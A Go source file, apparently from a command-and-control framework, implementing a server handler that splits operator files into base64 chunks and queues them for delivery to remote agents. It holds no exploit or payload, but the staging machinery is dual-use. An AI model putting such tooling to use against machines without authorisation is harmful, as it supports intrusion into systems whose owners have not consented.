// internal/agent/server/upload.go
package server

import (
	pb "c2/proto"
	"context"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"time"

	"github.com/google/uuid"
)

func (s *GRPCServer) HandleUpload(ctx context.Context, req *pb.HandleUploadRequest) (*pb.HandleUploadResponse, error) {
	log.Printf("[HandleUpload] Received upload notification - Agent: %s, File: %s -> %s",
		req.AgentId, req.OriginalFilename, req.CurrentFilename)

	// Read the file
	data, err := os.ReadFile(filepath.Join("/app/uploads", req.CurrentFilename))
	if err != nil {
		return &pb.HandleUploadResponse{
			Success: false,
			Message: fmt.Sprintf("Failed to read file: %v", err),
		}, nil
	}

	// Calculate chunks
	const chunkSize = 512 * 1024 // 512KB chunks
	totalChunks := (len(data) + chunkSize - 1) / chunkSize

	log.Printf("[HandleUpload] File size: %d bytes, will be split into %d chunks", len(data), totalChunks)

	// Start database transaction
	tx, err := s.db.BeginTx(ctx, &sql.TxOptions{
		Isolation: sql.LevelReadCommitted,
	})
	if err != nil {
		return &pb.HandleUploadResponse{
			Success: false,
			Message: fmt.Sprintf("Database error: %v", err),
		}, nil
	}
	defer tx.Rollback()

	// Store initial command in database
	var commandDBID int
	err = tx.QueryRowContext(ctx, `
        INSERT INTO commands (username, guid, command, timestamp)
        VALUES ($1, $2, $3, $4)
        RETURNING id`,
		"system",
		req.AgentId,
		fmt.Sprintf("upload %s %s", req.OriginalFilename, req.RemotePath),
		time.Now().Format(time.RFC3339),
	).Scan(&commandDBID)

	if err != nil {
		log.Printf("[HandleUpload] Failed to store command: %v", err)
		return &pb.HandleUploadResponse{
			Success: false,
			Message: fmt.Sprintf("Failed to store command: %v", err),
		}, nil
	}

	// Queue first chunk
	firstChunk := data
	if len(data) > chunkSize {
		firstChunk = data[:chunkSize]
	}

	// Base64 encode first chunk
	encodedChunk := base64.StdEncoding.EncodeToString(firstChunk)

	// Create command for first chunk
	cmd := Command{
		Command:      "upload",
		CommandID:    uuid.New().String(),
		CommandDBID:  commandDBID,
		AgentID:      req.AgentId,
		Filename:     req.CurrentFilename,
		RemotePath:   req.RemotePath,
		CurrentChunk: 0,
		TotalChunks:  totalChunks,
		Data:         encodedChunk,
		Timestamp:    time.Now().Format(time.RFC3339),
	}

	// Add first chunk to command buffer
	s.Mutex.Lock()
	if s.CommandBuffer[req.AgentId] == nil {
		s.CommandBuffer[req.AgentId] = make([]Command, 0)
	}
	s.CommandBuffer[req.AgentId] = append(s.CommandBuffer[req.AgentId], cmd)
	s.Mutex.Unlock()

	// Check if this is a single-chunk upload
	if totalChunks == 1 {
		// Single chunk upload - don't create temp directory
		log.Printf("[HandleUpload] Single chunk upload - no temp storage needed")

		if err := tx.Commit(); err != nil {
			log.Printf("[HandleUpload] Failed to commit transaction: %v", err)
			return &pb.HandleUploadResponse{
				Success: false,
				Message: fmt.Sprintf("Database error: %v", err),
			}, nil
		}

		log.Printf("[HandleUpload] Successfully queued single chunk for agent %s", req.AgentId)

		return &pb.HandleUploadResponse{
			Success: true,
			Message: "Single chunk upload queued successfully",
		}, nil
	}

	// Multi-chunk upload - store remaining chunks
	chunkDir := filepath.Join("/app/temp", req.CurrentFilename)
	log.Printf("[HandleUpload] Creating chunk directory: %s", chunkDir)

	if err := os.MkdirAll(chunkDir, 0755); err != nil {
		log.Printf("[HandleUpload] Failed to create chunk directory: %v", err)
		return &pb.HandleUploadResponse{
			Success: false,
			Message: fmt.Sprintf("Failed to prepare chunks: %v", err),
		}, nil
	}

	// Save remaining chunks to disk (start from chunk 1, not 0)
	log.Printf("[HandleUpload] Saving chunks 1 through %d to disk", totalChunks-1)
	for i := 1; i < totalChunks; i++ {
		start := i * chunkSize
		end := start + chunkSize
		if end > len(data) {
			end = len(data)
		}

		chunkPath := filepath.Join(chunkDir, fmt.Sprintf("chunk_%d", i))
		chunkData := data[start:end]
		log.Printf("[HandleUpload] Writing chunk %d (size: %d bytes) to %s", i, len(chunkData), chunkPath)

		if err := os.WriteFile(chunkPath, chunkData, 0644); err != nil {
			log.Printf("[HandleUpload] Failed to write chunk %d: %v", i, err)
			// Clean up on failure
			os.RemoveAll(chunkDir)
			return &pb.HandleUploadResponse{
				Success: false,
				Message: fmt.Sprintf("Failed to prepare chunk %d: %v", i, err),
			}, nil
		}
	}

	// List directory contents for debugging
	files, _ := os.ReadDir(chunkDir)
	log.Printf("[HandleUpload] Chunk directory contents after writing:")
	for _, file := range files {
		info, _ := file.Info()
		log.Printf("  - %s (size: %d bytes)", file.Name(), info.Size())
	}

	// Store metadata for next chunks
	uploadInfo := struct {
		AgentID          string `json:"agent_id"`
		CommandDBID      int    `json:"command_db_id"`
		OriginalFilename string `json:"original_filename"`
		CurrentFilename  string `json:"current_filename"`
		RemotePath       string `json:"remote_path"`
		TotalChunks      int    `json:"total_chunks"`
		ChunkDir         string `json:"chunk_dir"`
		CurrentChunk     int    `json:"current_chunk"`
	}{
		AgentID:          req.AgentId,
		CommandDBID:      commandDBID,
		OriginalFilename: req.OriginalFilename,
		CurrentFilename:  req.CurrentFilename,
		RemotePath:       req.RemotePath,
		TotalChunks:      totalChunks,
		ChunkDir:         chunkDir,
		CurrentChunk:     0, // We've already sent chunk 0
	}

	// Store metadata
	metadataPath := filepath.Join(chunkDir, "metadata.json")
	metadataJSON, _ := json.Marshal(uploadInfo)
	log.Printf("[HandleUpload] Writing metadata to %s", metadataPath)
	if err := os.WriteFile(metadataPath, metadataJSON, 0644); err != nil {
		log.Printf("[HandleUpload] Failed to write metadata: %v", err)
		// Clean up on failure
		os.RemoveAll(chunkDir)
		return &pb.HandleUploadResponse{
			Success: false,
			Message: fmt.Sprintf("Failed to store upload metadata: %v", err),
		}, nil
	}

	if err := tx.Commit(); err != nil {
		log.Printf("[HandleUpload] Failed to commit transaction: %v", err)
		// Clean up on failure
		os.RemoveAll(chunkDir)
		return &pb.HandleUploadResponse{
			Success: false,
			Message: fmt.Sprintf("Database error: %v", err),
		}, nil
	}

	log.Printf("[HandleUpload] Successfully queued first chunk for agent %s. Total chunks: %d, Chunks stored: %d",
		req.AgentId, totalChunks, totalChunks-1)

	return &pb.HandleUploadResponse{
		Success: true,
		Message: fmt.Sprintf("Upload initialized with %d chunks", totalChunks),
	}, nil
}

// Add this method to the GRPCServer struct
func (s *GRPCServer) queueNextChunk(agentID string, chunkDir string) error {
	log.Printf("[QueueNextChunk] Starting for agent %s, chunk dir: %s", agentID, chunkDir)

	// Check if directory exists
	if _, err := os.Stat(chunkDir); os.IsNotExist(err) {
		log.Printf("[QueueNextChunk] ERROR: Chunk directory does not exist: %s", chunkDir)
		return fmt.Errorf("chunk directory does not exist: %s", chunkDir)
	}

	// List directory contents for debugging
	files, _ := os.ReadDir(chunkDir)
	log.Printf("[QueueNextChunk] Chunk directory contents:")
	for _, file := range files {
		log.Printf("  - %s", file.Name())
	}

	// Read metadata
	metadataPath := filepath.Join(chunkDir, "metadata.json")
	metadataBytes, err := os.ReadFile(metadataPath)
	if err != nil {
		log.Printf("[QueueNextChunk] ERROR: Failed to read metadata from %s: %v", metadataPath, err)
		// If we can't read metadata, try to clean up
		os.RemoveAll(chunkDir)
		return fmt.Errorf("failed to read metadata: %v", err)
	}

	var metadata struct {
		AgentID          string `json:"agent_id"`
		CommandDBID      int    `json:"command_db_id"`
		OriginalFilename string `json:"original_filename"`
		CurrentFilename  string `json:"current_filename"`
		RemotePath       string `json:"remote_path"`
		TotalChunks      int    `json:"total_chunks"`
		ChunkDir         string `json:"chunk_dir"`
		CurrentChunk     int    `json:"current_chunk"`
	}

	if err := json.Unmarshal(metadataBytes, &metadata); err != nil {
		log.Printf("[QueueNextChunk] ERROR: Failed to parse metadata: %v", err)
		// Clean up on parse error
		os.RemoveAll(chunkDir)
		return fmt.Errorf("failed to parse metadata: %v", err)
	}

	log.Printf("[QueueNextChunk] Current metadata: CurrentChunk=%d, TotalChunks=%d",
		metadata.CurrentChunk, metadata.TotalChunks)

	// Increment the current chunk
	metadata.CurrentChunk++

	// If we've sent all chunks, clean up
	if metadata.CurrentChunk >= metadata.TotalChunks {
		log.Printf("[QueueNextChunk] All chunks sent (%d/%d), cleaning up",
			metadata.CurrentChunk, metadata.TotalChunks)
		if err := os.RemoveAll(chunkDir); err != nil {
			log.Printf("[QueueNextChunk] Warning: Failed to clean up chunk directory: %v", err)
		} else {
			log.Printf("[QueueNextChunk] Successfully cleaned up chunk directory for %s", metadata.CurrentFilename)
		}
		return nil
	}

	// Read next chunk
	chunkPath := filepath.Join(chunkDir, fmt.Sprintf("chunk_%d", metadata.CurrentChunk))
	log.Printf("[QueueNextChunk] Attempting to read chunk from: %s", chunkPath)

	chunkData, err := os.ReadFile(chunkPath)
	if err != nil {
		log.Printf("[QueueNextChunk] ERROR: Failed to read chunk %d from %s: %v",
			metadata.CurrentChunk, chunkPath, err)
		// List what files are actually there
		files, _ := os.ReadDir(chunkDir)
		log.Printf("[QueueNextChunk] Available files in directory:")
		for _, file := range files {
			log.Printf("  - %s", file.Name())
		}
		// If we can't read the chunk, clean up everything
		os.RemoveAll(chunkDir)
		return fmt.Errorf("failed to read chunk %d: %v", metadata.CurrentChunk, err)
	}

	log.Printf("[QueueNextChunk] Successfully read chunk %d (size: %d bytes)",
		metadata.CurrentChunk, len(chunkData))

	// Base64 encode chunk
	encodedChunk := base64.StdEncoding.EncodeToString(chunkData)

	// Create command for next chunk
	cmd := Command{
		Command:      "upload",
		CommandID:    uuid.New().String(),
		CommandDBID:  metadata.CommandDBID,
		AgentID:      agentID,
		Filename:     metadata.CurrentFilename,
		RemotePath:   metadata.RemotePath,
		CurrentChunk: metadata.CurrentChunk,
		TotalChunks:  metadata.TotalChunks,
		Data:         encodedChunk,
		Timestamp:    time.Now().Format(time.RFC3339),
	}

	// Queue the chunk using the command buffer
	s.Mutex.Lock()
	if s.CommandBuffer[agentID] == nil {
		s.CommandBuffer[agentID] = make([]Command, 0)
	}
	s.CommandBuffer[agentID] = append(s.CommandBuffer[agentID], cmd)
	s.Mutex.Unlock()

	// Update and save metadata
	updatedMetadataBytes, err := json.Marshal(metadata)
	if err != nil {
		return fmt.Errorf("failed to marshal updated metadata: %v", err)
	}

	if err := os.WriteFile(metadataPath, updatedMetadataBytes, 0644); err != nil {
		return fmt.Errorf("failed to save updated metadata: %v", err)
	}

	log.Printf("[QueueNextChunk] Successfully queued chunk %d/%d for agent %s",
		metadata.CurrentChunk, metadata.TotalChunks, agentID)

	return nil
}
